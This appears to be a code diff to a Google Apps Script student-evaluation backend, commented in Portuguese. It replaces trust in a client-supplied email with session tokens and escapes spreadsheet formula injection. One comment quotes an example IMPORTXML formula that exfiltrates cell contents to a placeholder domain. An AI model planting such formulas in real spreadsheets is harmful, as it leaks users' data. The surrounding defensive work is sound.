@@ -89,7 +89,10 @@ function avaliarPlantao(dados) {
   try {
     if (!dados || typeof dados !== 'object') throw new Error('Dados inválidos');
 
-    const email = normalizarTexto(dados.email).toLowerCase();
+    // O e-mail vem do token de sessão (dados.token), nunca de dados.email —
+    // ver appscript/autenticacao.gs. Um cliente não pode mais avaliar um
+    // plantão "como" outro aluno só trocando esse campo no payload.
+    const email = emailAutenticado(dados).toLowerCase();
     const curso = normalizarTexto(dados.curso);
     const idPlantao = normalizarTexto(dados.id_plantao);
     const numero = Number(dados.numero || 0);
@@ -201,6 +204,20 @@ RETORNE APENAS JSON VÁLIDO:
   }
 }
 
+/**
+ * Neutraliza injeção de fórmula (CWE-1236): appendRow/setValues gravam uma
+ * célula exatamente como se fosse digitada no Sheets, então um valor que
+ * começa com "=", "+", "-" ou "@" vira fórmula viva assim que alguém abrir a
+ * planilha — por exemplo =IMPORTXML("https://dominio/"&A1) exfiltrando outras
+ * células. O texto aqui é sempre resposta livre de aluno, então força texto
+ * prefixando com apóstrofo, do mesmo jeito que o próprio editor do Sheets faz
+ * quando alguém digita um valor assim numa célula formatada como texto.
+ */
+function neutralizarFormula(texto) {
+  const t = String(texto === undefined || texto === null ? '' : texto);
+  return /^[=+\-@]/.test(t) ? "'" + t : t;
+}
+
 function salvarCasoPlantao(email, curso, idPlantao, numero, perfil, nota, tempoSeg, resposta, feedback, expirou) {
   const sheet = getOrCreateSheet(PLANTAO.SHEET, [
     'timestamp', 'email', 'curso', 'id_plantao', 'caso_numero', 'perfil',
@@ -217,8 +234,8 @@ function salvarCasoPlantao(email, curso, idPlantao, numero, perfil, nota, tempoS
     nota === null || nota === undefined ? '' : nota,
     tempoSeg,
     expirou ? 'SIM' : 'NAO',
-    resposta,
-    feedback
+    neutralizarFormula(resposta),
+    neutralizarFormula(feedback)
   ]);
 }
 
@@ -312,6 +329,10 @@ function testarPlantao() {
 
   const EMAIL_TESTE = 'teste@ibsdh.com.br';
   const CURSO_TESTE = 'Practitioner';
+  // Emite o token direto (sem passar pelo e-mail de OTP): é um atalho válido
+  // só porque este diagnóstico já roda dentro do editor, com o mesmo
+  // SESSION_SECRET do projeto — não é assim que o cliente real obtém um token.
+  const TOKEN_TESTE = emitirTokenSessao(EMAIL_TESTE);
 
   Logger.log('1) gerar ------------------------------------------------');
   const bruto = chamar({ action: 'plantao_gerar', curso: CURSO_TESTE });
@@ -335,7 +356,7 @@ function testarPlantao() {
   Logger.log(chamar({
     action: 'plantao_avaliar',
     dados: {
-      email: EMAIL_TESTE,
+      token: TOKEN_TESTE,
       curso: CURSO_TESTE,
       id_plantao: 'teste-' + new Date().getTime(),
       numero: 1,
@@ -351,13 +372,18 @@ function testarPlantao() {
   }));
 
   Logger.log('3) histórico --------------------------------------------');
-  Logger.log(chamar({ action: 'plantao_historico', email: EMAIL_TESTE, curso: CURSO_TESTE }));
+  Logger.log(chamar({ action: 'plantao_historico', token: TOKEN_TESTE, curso: CURSO_TESTE }));
 }
 
 
 // =============================================================================
 // PASSO FINAL — adicione estes 3 casos no switch do doPost, no Codigo.gs,
 // logo antes de `default:`
+//
+// Os três agora exigem `payload.token` (ver appscript/autenticacao.gs) em vez
+// de confiar em payload.email/payload.dados.email — sem isso, qualquer
+// cliente podia avaliar ou consultar o plantão "como" outro aluno só trocando
+// esse campo (achado F1 da auditoria de segurança).
 // =============================================================================
 
 /*
@@ -370,14 +396,16 @@ function testarPlantao() {
 
         case 'plantao_avaliar':
           try {
-            return jsonResponse(avaliarPlantao(payload.dados));
+            const dadosPlantao = payload.dados || {};
+            dadosPlantao.token = payload.token;   // nunca confiar em dadosPlantao.email
+            return jsonResponse(avaliarPlantao(dadosPlantao));
           } catch(err) {
             return jsonResponse({ erro: true, mensagem: err.message });
           }
 
         case 'plantao_historico':
           try {
-            return jsonResponse(buscarHistoricoPlantao(payload.email, payload.curso));
+            return jsonResponse(buscarHistoricoPlantao(emailAutenticado(payload), payload.curso));
           } catch(err) {
             return jsonResponse({ erro: true, mensagem: err.message });
           }
